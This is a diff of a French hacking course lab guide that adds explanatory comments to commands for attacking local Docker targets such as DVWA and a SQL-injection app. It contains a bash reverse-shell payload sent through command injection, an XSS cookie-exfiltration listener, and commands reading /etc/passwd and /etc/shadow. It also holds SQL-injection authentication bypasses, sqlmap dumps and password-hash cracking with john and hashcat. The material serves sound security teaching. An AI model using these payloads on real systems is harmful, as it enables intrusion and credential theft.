@@ -18,27 +18,33 @@
 ## A.1 Vérification des outils Kali
 
 ```bash
-python3 --version     # → Python 3.10+
-docker --version      # → Docker 24+
-nmap --version        # → Nmap 7.94
-msfconsole --version  # → Metasploit 6.3
-sqlmap --version      # → sqlmap 1.7
-which nc              # → /usr/bin/nc
+# Vérification des versions installées des outils essentiels du pentest
+python3 --version     # → Python 3.10+  (interpréteur requis par sqlmap, scripts d'exploit)
+docker --version      # → Docker 24+  (moteur de conteneurisation pour les cibles du lab)
+nmap --version        # → Nmap 7.94  (scanner réseau standard)
+msfconsole --version  # → Metasploit 6.3  (framework d'exploitation)
+sqlmap --version      # → sqlmap 1.7  (outil automatisé d'injection SQL)
+which nc              # → /usr/bin/nc  (netcat : connexions TCP/UDP, reverse shells)
 ```
 
 Si un outil manque :
 ```bash
+# Installation de tous les outils manquants en une seule commande (-y = accepte sans confirmation)
 sudo apt update && sudo apt install -y docker.io docker-compose-v2 git nmap metasploit-framework sqlmap netcat-openbsd curl
-sudo usermod -aG docker $USER
+# Ajoute l'utilisateur courant au groupe docker pour éviter de taper sudo à chaque commande docker
+sudo usermod -aG docker $USER  # -aG = append to Group (préserve les groupes existants)
 # redémarrer la session
 ```
 
 ## A.2 Arborescence de travail
 
 ```bash
+# Création de l'arborescence de travail pour les 5 jours de cours + hors-série (-p = crée les parents si absents)
 mkdir -p ~/cours-hacking/{jour-1,jour-2,jour-3,jour-4,jour-5,hors-serie}
+# Création des sous-dossiers labs/ pour chaque jour (brace expansion : génère jour-1/labs, jour-2/labs, etc.)
 mkdir -p ~/cours-hacking/jour-{1,2,3,4,5}/labs
 cd ~/cours-hacking
+# Clone du dépôt Git contenant les supports de cours, Dockerfiles et docker-compose.yml
 git clone https://github.com/yugmerabtene/techniques-hacking-mdj.git repo
 ```
 
@@ -73,6 +79,7 @@ Une fois le dépôt cloné, votre arborescence de travail est la suivante :
 
 ```bash
 cd ~/cours-hacking/repo
+# Lancement de tous les conteneurs cibles en arrière-plan (-d = mode détaché) avec reconstruction des images si nécessaire (--build)
 docker compose up -d --build
 ```
 
@@ -100,40 +107,42 @@ flowchart TB
 ## A.4 Validation de chaque vulnérabilité
 
 ```bash
-# DVWA
+# DVWA — Vérification que l'application web répond sur le port 8080 (-I = requête HEAD, ne télécharge que les en-têtes)
 curl -I http://localhost:8080/login.php
 # → HTTP/1.1 200 OK
 # Login : admin / password → DVWA Security → low
 
-# SQLi App
+# SQLi App — Test de la page de recherche avec injection basique sur le paramètre id
 curl "http://localhost:8083/?page=search&id=1"
-# → Laptop Pro X
+# → Laptop Pro X  (le produit avec id=1 s'affiche, l'appli est accessible)
+# Bypass d'authentification : injection SQL commentée (--), -s = mode silencieux (pas de barre de progression)
 curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep -o "Connecté"
-# → Connecté en tant que admin
+# → Connecté en tant que admin  (le commentaire -- neutralise le check du password)
 
-# vsftpd 2.3.4
+# vsftpd 2.3.4 — Bannière FTP attendue sur le port 21 (-w2 = timeout de 2 secondes)
 echo "" | nc -w2 localhost 21
-# → 220 (vsFTPd 2.3.4)
+# → 220 (vsFTPd 2.3.4)  (version connue vulnérable, exploitable via Metasploit)
 
-# Samba
+# Samba — Scan nmap de détection de version (-sV) sur le port 445 uniquement (-p)
 nmap -sV -p 445 localhost | grep 445
-# → 445/tcp open netbios-ssn Samba smbd 3.0.20
+# → 445/tcp open netbios-ssn Samba smbd 3.0.20  (version ancienne vulnérable)
 
-# Buffer overflow
+# Buffer overflow — Vérification que le port 9001 est ouvert (-z = scan sans envoyer de données)
 nc -z localhost 9001 && echo "OK"
 
-# WAF
+# WAF — Requête normale : code HTTP attendu → 200 (-o /dev/null = jette le corps, -w formate la sortie)
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1"
-# → 200
+# → 200  (page accessible normalement)
+# Requête avec injection SQL : le WAF (ModSecurity) doit bloquer → 403 Forbidden
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1 OR 1=1"
-# → 403 (WAF bloque)
+# → 403 (WAF bloque)  (ModSecurity détecte et rejette la tentative d'injection SQL)
 
-# Secure Linux
+# Secure Linux — Test de connectivité SSH sur le port 2222
 nc -z localhost 2222 && echo "SSH OK"
 
-# Forensic victim
+# Forensic victim — Exécution de commande via le paramètre cmd (command injection volontaire pour les exercices forensic)
 curl "http://localhost:8082/?cmd=id"
-# → uid=33(www-data)
+# → uid=33(www-data)  (l'utilisateur serveur web est bien www-data, injection confirmée)
 
 # Validation automatique
 cd ~/cours-hacking/repo
@@ -207,18 +216,26 @@ flowchart LR
 ### nmap → T1046 Network Service Scanning
 
 ```bash
+# nmap -sV : détection de version des services (-sV = probe les bannières pour identifier version précise)
 nmap -sV <IP>              # Scan avec version
+# nmap -A : mode agressif = OS fingerprint (-O) + scripts (-sC) + versions (-sV) + traceroute
 nmap -A <IP>               # OS + scripts + versions
+# nmap --script vuln : exécute les scripts NSE de la catégorie vuln (détection CVE connues)
 nmap --script vuln <IP>    # Vulnérabilités connues
 ```
 
 ### Metasploit → TA0001-TA0006
 
 ```bash
+# Lancement de la console interactive Metasploit (framework d'exploitation modulaire)
 msfconsole
+# Recherche d'un exploit par mot-clé (ex: vsftpd, samba, eternalblue)
 search <exploit>
+# Sélection du module d'exploit à utiliser (chemin complet dans l'arborescence Metasploit)
 use <chemin>
+# Définit l'adresse IP de la cible distante (RHOSTS = Remote HoSTS)
 set RHOSTS <IP>
+# Lance l'exploit configuré contre la cible
 exploit
 ```
 
@@ -279,8 +296,11 @@ admin' OR '1'='1' --
 **Fonctionnement :** `system("ping " + $input)` exécute `ping 127.0.0.1; ls /etc/`. Le `;` termine la première commande et en lance une seconde.
 
 ```bash
+# Commande séparateur ; exécute ls après le ping (le point-virgule termine la 1ère commande et en lance une 2ème)
 ; ls /etc/passwd
+# Pipe | redirige la sortie du ping vers whoami (qui ignore l'entrée mais s'exécute quand même)
 | whoami
+# Opérateur && exécute cat seulement si le ping réussit (code retour 0)
 && cat /etc/shadow
 ```
 
@@ -302,9 +322,10 @@ Avant tout pentest, on scanne la cible pour cartographier sa surface d'attaque. 
 
 ```bash
 cd ~/cours-hacking/jour-1/labs
+# Scan nmap : détection de version (-sV) sur le port DVWA (-p 8080), sortie sauvegardée dans un fichier avec tee (affiche ET écrit)
 nmap -sV -p 8080 localhost | tee nmap_dvwa.txt
 # PORT     STATE SERVICE VERSION
-# 8080/tcp open  http    Apache httpd 2.4.X
+# 8080/tcp open  http    Apache httpd 2.4.X  (confirme le service web Apache sur le port attendu)
 ```
 
 ### Étape 2 — Énumération gobuster
@@ -312,21 +333,23 @@ nmap -sV -p 8080 localhost | tee nmap_dvwa.txt
 ```bash
 # Toujours dans ~/cours-hacking/jour-1/labs/
 cd ~/cours-hacking/jour-1/labs
+# Énumération de répertoires web avec gobuster : mode dir, url cible (-u), wordlist de noms communs (-w), mode silencieux (-q sans bannière)
 gobuster dir -u http://localhost:8080 \
   -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
-# /login.php (Status: 200)
-# /vulnerabilities (Status: 301)
-# /config (Status: 301)
+# /login.php (Status: 200)         → page de connexion accessible
+# /vulnerabilities (Status: 301)   → répertoire des pages vulnérables (redirection)
+# /config (Status: 301)            → répertoire de configuration (potentiellement sensible)
 ```
 
 ### Étape 3 — Connexion DVWA
 
 ```bash
-# Vérifier le login (admin / password)
+# Connexion à DVWA : -s = silencieux, -c = sauvegarde le cookie de session dans un fichier, -d = données POST (formulaire)
+# grep -o extrait soit "Welcome" (succès) soit "Login failed" (échec) pour valider le login admin/password
 curl -s -c /tmp/dvwa_cookie.txt \
   -d "username=admin&password=password&Login=Login" \
   "http://localhost:8080/login.php" | grep -o "Welcome\|Login failed"
-# → Welcome
+# → Welcome  (authentification réussie, le cookie est stocké dans /tmp/dvwa_cookie.txt)
 
 # Firefox : http://localhost:8080 → DVWA Security → low
 ```
@@ -364,7 +387,8 @@ Dans DVWA → **XSS (Reflected)** → champ "What's your name?" :
 **Terminal 1** — écouteur HTTP :
 ```bash
 cd ~/cours-hacking/jour-1/labs
-python3 -m http.server 8000
+# Lancement d'un serveur HTTP minimal sur le port 8000 (-m http.server) pour recevoir les cookies exfiltrés via XSS
+python3 -m http.server 8000  # Écoute sur toutes les interfaces, affiche chaque requête entrante (GET /?cookie=...)
 ```
 
 **Terminal 2** — payload dans DVWA (remplacer l'IP par `hostname -I`) :
@@ -404,10 +428,13 @@ La requête `SELECT first_name, last_name FROM users WHERE user_id = '$id'` devi
 **Important :** remplacez `XXXX` par votre PHPSESSID. Pour l'obtenir : Firefox → DVWA → F12 → Storage → Cookies → copier la valeur de `PHPSESSID`.
 
 ```bash
+# Test manuel d'injection SQL : -b envoie le cookie PHPSESSID (authentification) + security=low (niveau de sécurité DVWA)
+# L'URL contient ' OR '1'='1' # encodé en URL (%27 = ', %20 = espace, %3D = =, %23 = #)
+# grep -c compte les occurrences de "First name" → doit retourner 5 (tous les users) au lieu de 1
 curl -s -b "PHPSESSID=XXXX;security=low" \
   "http://localhost:8080/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \
   | grep -c "First name"
-# → 5 (5 utilisateurs affichés au lieu d'1)
+# → 5 (5 utilisateurs affichés au lieu d'1)  (injection SQL confirmée : tous les enregistrements sont retournés)
 ```
 
 ### Étape 2 — sqlmap : dumper les utilisateurs
@@ -416,6 +443,8 @@ curl -s -b "PHPSESSID=XXXX;security=low" \
 cd ~/cours-hacking/jour-1/labs
 # Remplacer XXXX par le PHPSESSID (Firefox → F12 → Storage → Cookies)
 
+# sqlmap : -u = URL cible, --cookie = cookie de session pour l'authentification, -D = base de données cible (dvwa)
+# -T users = table cible, -C user,password = colonnes à extraire, --dump = affiche le contenu, --batch = mode non-interactif
 sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=XXXX;security=low" \
   -D dvwa -T users -C user,password --dump --batch
@@ -465,17 +494,21 @@ DVWA → **Command Injection** :
 
 **Terminal 1** — écouteur :
 ```bash
-nc -lvnp 4444
+# Écouteur netcat : -l = mode listen (serveur), -v = verbeux, -n = pas de résolution DNS (plus rapide), -p 4444 = port d'écoute
+nc -lvnp 4444  # Attend une connexion entrante du reverse shell, donne un prompt interactif une fois connecté
 ```
 
 **Terminal 2** — via DVWA (remplacer `<KALI_IP>` par l'IP de votre Kali) :
 ```bash
-# Pour trouver la bonne IP (le conteneur doit pouvoir joindre Kali) :
+# Trouve l'IP de l'interface docker0 (passerelle entre l'hôte Kali et les conteneurs Docker)
+# ip addr show docker0 = affiche la config réseau, grep 'inet ' = filtre la ligne IPv4
+# awk '{print $2}' = extrait l'IP/CIDR, cut -d/ -f1 = retire le masque (/16) pour ne garder que l'IP
 ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
-# → généralement 172.17.0.1
+# → généralement 172.17.0.1  (c'est l'IP que les conteneurs utilisent pour joindre l'hôte Kali)
 
 # Payload dans DVWA Command Injection :
-127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
+# bash -c exécute la chaîne comme commande, bash -i = mode interactif, >& /dev/tcp/IP/PORT = redirige stdin/stdout vers la socket TCP
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'  # Ouvre un shell inversé vers l'écouteur Kali
 ```
 
 **Checkpoint :** Retournez dans le **Terminal 1** (netcat) : une connexion entrante apparaît, suivie d'un prompt shell. Tapez `whoami` → `www-data`.
@@ -509,8 +542,11 @@ L'application `sqli-app` (http://localhost:8083) expose 3 points d'injection dif
 ### Prérequis
 
 ```bash
+# Démarre uniquement le conteneur sqli-app (sans reconstruire les autres) en mode détaché
 docker compose up -d sqli-app
+# Vérification rapide que l'appli web répond (-I = HEAD, ne télécharge que les en-têtes HTTP)
 curl -I http://localhost:8083/
+# Création du dossier de labs jour-1 et déplacement dedans (&& garantit l'exécution séquentielle)
 mkdir -p ~/cours-hacking/jour-1/labs && cd ~/cours-hacking/jour-1/labs
 ```
 
@@ -519,43 +555,49 @@ mkdir -p ~/cours-hacking/jour-1/labs && cd ~/cours-hacking/jour-1/labs
 **Point 1 : Paramètre `?id=` (numeric)**
 
 ```bash
-# Normal
+# Requête normale : récupère le produit avec id=1, grep -o extrait uniquement le nom du produit attendu
 curl -s "http://localhost:8083/?page=search&id=1" | grep -o "Laptop\|Monitor\|Keyboard"
-# → Laptop Pro X
+# → Laptop Pro X  (un seul produit retourné, comportement normal)
 
-# Test SQLi : toujours vrai
+# Test SQLi toujours vrai : id=1 OR 1=1 (encodé URL : %20 = espace), grep -c <tr> compte les lignes de tableau
+# Si plus d'une ligne → tous les produits sont retournés → injection confirmée
 curl -s "http://localhost:8083/?page=search&id=1%20OR%201=1" | grep -c "<tr>"
-# → 6 (affiche tous les produits au lieu d'un seul)
+# → 6 (affiche tous les produits au lieu d'un seul)  (la condition OR 1=1 est toujours vraie)
 
-# Test SQLi : toujours faux
+# Test SQLi toujours faux : id=1 AND 1=2 (contradiction logique), grep -o cherche "Aucun" dans la réponse
+# Permet de confirmer l'injection sans extraire de données (moins bruyant)
 curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
-# → Aucun produit trouvé
+# → Aucun produit trouvé  (la condition AND 1=2 est toujours fausse → aucun résultat)
 ```
 
 **Point 2 : Formulaire de login (string injection)**
 
 ```bash
-# Normal → échoue
+# Login normal avec mauvais mot de passe : doit retourner "Identifiants incorrects" (comportement attendu)
 curl -s -d "page=login&username=admin&password=wrong" "http://localhost:8083/" | grep "Identifiants"
-# →  Identifiants incorrects
+# →  Identifiants incorrects  (échec normal, l'authentification fonctionne)
 
-# SQLi : bypass d'authentification
+# SQLi bypass auth : admin' -- (le -- commente la vérification du password dans la clause WHERE)
+# %20 = espace, le guillemet ferme la chaîne, -- neutralise le reste de la requête SQL
 curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep "Connecté"
-# →  Connecté en tant que admin
+# →  Connecté en tant que admin  (bypass réussi, connecté sans connaître le mot de passe)
 
-# SQLi : toujours vrai
+# SQLi toujours vrai sur le login : ' OR '1'='1' -- force la clause WHERE à être vraie pour toutes les lignes
+# grep -c "Connecté" compte le nombre d'utilisateurs connectés → tous les comptes sont retournés
 curl -s -d "page=login&username='%20OR%20'1'='1'%20--&password=x" "http://localhost:8083/" | grep -c "Connecté"
-# → 6 (tous les utilisateurs sont "connectés")
+# → 6 (tous les utilisateurs sont "connectés")  (la condition toujours vraie retourne tous les comptes)
 ```
 
 **Point 3 : Filtre `?filter=` (LIKE injection)**
 
 ```bash
-# Normal
+# Recherche normale par filtre : retourne l'utilisateur "john", grep <td> filtre les cellules HTML, wc -l les compte
+# Chaque utilisateur occupe 4 cellules (id, username, email, actions) → 4 cellules = 1 utilisateur
 curl -s "http://localhost:8083/?page=users&filter=john" | grep "<td>" | wc -l
-# → 4 (4 cellules = 1 ligne utilisateur)
+# → 4 (4 cellules = 1 ligne utilisateur)  (comportement normal, filtre fonctionnel)
 
-# SQLi : UNION pour extraire d'autres tables
+# SQLi UNION sur filtre LIKE : %25' = %' (fermeture du LIKE), UNION SELECT injecte des colonnes d'une autre table
+# 1 = placeholder numérique, username/password/email = colonnes de la table users à exfiltrer
 curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,username,password,email%20FROM%20users%20--" | grep "<td>"
 ```
 
@@ -566,7 +608,8 @@ curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,user
 ```bash
 cd ~/cours-hacking/jour-1/labs
 
-# Lister les tables
+# sqlmap : --tables = énumère toutes les tables de la base, --batch = mode non-interactif (répond oui par défaut)
+# 2>&1 redirige stderr vers stdout pour tout capturer, tee sauvegarde la sortie ET l'affiche dans le terminal
 sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch 2>&1 | tee sqli_tables.txt
 ```
 
@@ -581,7 +624,8 @@ Sortie attendue :
 ```
 
 ```bash
-# Dumper les colonnes de la table users
+# sqlmap : -T users = table cible, --columns = énumère toutes les colonnes et leurs types
+# Permet de savoir quelles colonnes existent avant de les dumper (username, password, email, role)
 sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
 ```
 
@@ -599,7 +643,8 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
 ```
 
 ```bash
-# Extraire tous les utilisateurs avec leurs hashs
+# sqlmap : -T users = table, -C username,password,email,role = colonnes à extraire (séparées par des virgules)
+# --dump = vide le contenu, --batch = non-interactif, 2>&1 | tee = capture toute la sortie dans sqli_dump.txt
 sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T users -C username,password,email,role --dump --batch 2>&1 | tee sqli_dump.txt
 ```
@@ -628,7 +673,9 @@ Sortie attendue :
 ```bash
 cd ~/cours-hacking/jour-1/labs
 
-# Préparer le fichier de hashs
+# Création du fichier de hashs au format username:hash (une entrée par ligne)
+# cat > avec heredoc (<< 'EOF') écrit le contenu multiligne dans hashes.txt
+# Les guillemets autour de EOF empêchent l'expansion des variables dans le heredoc
 cat > hashes.txt << 'EOF'
 admin:5f4dcc3b5aa765d61d8327deb882cf99
 john_doe:482c811da5d5b4bc6d497ffa98491e38
@@ -638,12 +685,15 @@ guest:098f6bcd4621d373cade4e832627b4f6
 flag_user:21232f297a57a5a743894a0e4a801fc3
 EOF
 
-# Le fichier rockyou.txt est compressé par défaut sur Kali
+# Décompression de la wordlist rockyou.txt (la plus utilisée en cracking, ~14 millions de mots de passe)
+# 2>/dev/null supprime les erreurs si déjà décompressé, || true évite que la commande échoue
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
 
-# Crack avec john (format raw-md5)
+# Crack avec john : --format=raw-md5 = force le mode MD5 brut (sans sel), --wordlist = dictionnaire utilisé
+# 2>/dev/null masque les avertissements (souvent verbeux sur les formats)
 john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null
-john --show --format=raw-md5 hashes.txt
+# Affichage des mots de passe craqués : --show affiche les résultats, --format force le même format
+john --show --format=raw-md5 hashes.txt  # Affiche tous les mots de passe déjà trouvés
 ```
 
 Sortie attendue :
@@ -660,6 +710,8 @@ flag_user:admin
 #### Méthode 2 : recherche en ligne (optionnelle)
 
 ```bash
+# Méthode alternative : recherche des hashs dans des bases rainbow tables en ligne (CrackStation, md5decrypt)
+# Utile quand john/hashcat ne trouve pas — ces sites pré-calculent les hashs MD5 des mots communs
 # CrackStation.net ou md5decrypt.net
 # 5f4dcc3b5aa765d61d8327deb882cf99 → password
 # e99a18c428cb38d5f260853678922e03 → abc123
@@ -670,6 +722,8 @@ flag_user:admin
 
 ```bash
 cd ~/cours-hacking/jour-1/labs
+# hashcat : -m 0 = mode MD5 (hash type 0), -a 0 = attaque par dictionnaire (straight), --username = ignore la partie user: du fichier
+# --force = ignore les avertissements (pilote GPU manquant, matériel non optimal)
 hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
@@ -680,7 +734,8 @@ hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```bash
 cd ~/cours-hacking/jour-1/labs
 
-# Dans la table products, un champ secret_flag existe
+# Extraction du flag caché dans la table products : -T products = table cible, -C name,secret_flag = colonnes à dumper
+# Le champ secret_flag contient le flag CTF à trouver (contient NULL pour les produits sans flag)
 sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T products -C name,secret_flag --dump --batch
 ```
